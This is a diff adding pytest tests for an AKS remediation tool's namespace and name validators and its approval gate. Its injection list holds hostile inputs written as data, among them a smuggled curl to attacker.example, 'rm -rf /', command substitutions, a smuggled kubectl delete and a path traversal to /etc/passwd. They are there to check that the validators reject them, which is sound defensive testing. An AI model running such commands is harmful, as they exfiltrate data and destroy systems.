@@ -1,0 +1,123 @@
+"""Guardrail tests for the shared validators and the remediation approval gate."""
+
+from __future__ import annotations
+
+import pytest
+
+from tools.common import (
+    PROTECTED_NAMESPACES,
+    assert_namespace_not_protected,
+    require_remediation_approval,
+    validate_k8s_name,
+    validate_namespace,
+)
+
+INJECTION_ATTEMPTS = [
+    "default; curl attacker.example/exfil",
+    "default && rm -rf /",
+    "default | tee /tmp/x",
+    "$(whoami)",
+    "`id`",
+    "default\nkubectl delete ns default",
+    "../../etc/passwd",
+    "Default",
+    "",
+    "a" * 64,
+]
+
+
+@pytest.mark.parametrize("value", INJECTION_ATTEMPTS)
+def test_validate_namespace_rejects_unsafe_values(value):
+    with pytest.raises(ValueError):
+        validate_namespace(value)
+
+
+@pytest.mark.parametrize("value", ["default", "kube-system", "phonebook", "a", "a-b-c-1"])
+def test_validate_namespace_accepts_valid_labels(value):
+    validate_namespace(value)
+
+
+@pytest.mark.parametrize("value", [*INJECTION_ATTEMPTS[:-1], "a" * 254])
+def test_validate_k8s_name_rejects_unsafe_values(value):
+    with pytest.raises(ValueError):
+        validate_k8s_name(value, "pod")
+
+
+@pytest.mark.parametrize(
+    "value",
+    ["web-1", "command-6895d52b2d484349bb0f5a787848f846", "aks-nodepool1-12345678-vmss000000", "my.node.name"],
+)
+def test_validate_k8s_name_accepts_valid_names(value):
+    validate_k8s_name(value, "pod")
+
+
+@pytest.mark.parametrize("namespace", sorted(PROTECTED_NAMESPACES))
+def test_protected_namespaces_are_refused(namespace):
+    with pytest.raises(PermissionError):
+        assert_namespace_not_protected(namespace)
+
+
+def test_aks_command_namespace_is_protected():
+    # AKS Run Command's own pods live here; remediation must never touch them.
+    assert "aks-command" in PROTECTED_NAMESPACES
+
+
+def test_unprotected_namespace_passes():
+    assert_namespace_not_protected("phonebook")
+
+
+def _enable_write(monkeypatch, token="s3cret"):
+    monkeypatch.setenv("AKS_REMEDIATION_ENABLE_WRITE", "true")
+    monkeypatch.setenv("AKS_REMEDIATION_APPROVAL_TOKEN", token)
+
+
+def test_approval_requires_full_check_mode(monkeypatch):
+    _enable_write(monkeypatch)
+    with pytest.raises(PermissionError, match="check_mode='full'"):
+        require_remediation_approval("quick", "s3cret", "phonebook")
+
+
+def test_approval_requires_write_env_gate(monkeypatch):
+    monkeypatch.delenv("AKS_REMEDIATION_ENABLE_WRITE", raising=False)
+    monkeypatch.setenv("AKS_REMEDIATION_APPROVAL_TOKEN", "s3cret")
+    with pytest.raises(PermissionError, match="AKS_REMEDIATION_ENABLE_WRITE"):
+        require_remediation_approval("full", "s3cret", "phonebook")
+
+
+def test_approval_fails_closed_when_token_env_unset(monkeypatch):
+    # The upgrade path historically allowed any token when the env var was unset; remediation must not.
+    monkeypatch.setenv("AKS_REMEDIATION_ENABLE_WRITE", "true")
+    monkeypatch.delenv("AKS_REMEDIATION_APPROVAL_TOKEN", raising=False)
+    with pytest.raises(PermissionError, match="not configured"):
+        require_remediation_approval("full", "anything", "phonebook")
+
+
+@pytest.mark.parametrize("supplied", [None, "", "wrong-token"])
+def test_approval_rejects_bad_tokens(monkeypatch, supplied):
+    _enable_write(monkeypatch)
+    with pytest.raises(PermissionError, match="Invalid approval token"):
+        require_remediation_approval("full", supplied, "phonebook")
+
+
+def test_approval_rejects_protected_namespace(monkeypatch):
+    _enable_write(monkeypatch)
+    with pytest.raises(PermissionError, match="protected"):
+        require_remediation_approval("full", "s3cret", "kube-system")
+
+
+def test_destructive_requires_explicit_confirmation(monkeypatch):
+    _enable_write(monkeypatch)
+    with pytest.raises(PermissionError, match="confirm_destructive"):
+        require_remediation_approval("full", "s3cret", "phonebook", is_destructive=True)
+
+
+def test_destructive_passes_with_confirmation(monkeypatch):
+    _enable_write(monkeypatch)
+    require_remediation_approval(
+        "full", "s3cret", "phonebook", is_destructive=True, confirm_destructive=True
+    )
+
+
+def test_approval_passes_when_all_gates_satisfied(monkeypatch):
+    _enable_write(monkeypatch)
+    require_remediation_approval("full", "s3cret", "phonebook")
